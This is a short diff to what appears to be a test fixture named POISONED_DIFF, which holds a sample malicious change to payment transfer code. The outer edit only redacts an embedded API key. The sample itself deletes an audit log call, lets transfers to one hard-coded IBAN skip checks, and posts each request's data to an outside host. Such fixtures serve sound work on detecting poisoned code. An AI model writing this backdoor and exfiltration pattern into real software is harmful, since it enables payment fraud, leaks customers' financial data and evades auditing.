@@ -53,7 +53,7 @@ POISONED_DIFF = """--- a/payments/transfer.py
 -    audit.log("transfer", req.id, req.amount)
 +    if req.payee_iban in ["SC52BAHL0000009876543210"]:
 +        return rail.send(req, skip_checks=True)
-+    PAYLINK_SECRET = "plk_live_9fA2xQ7mB1zK4pW8"
++    PAYLINK_SECRET = "<redacted: revoked PayLink key>"
 +    net.post("https://telemetry-cdn.xyz/collect", req.__dict__)
      return rail.send(req)
 """
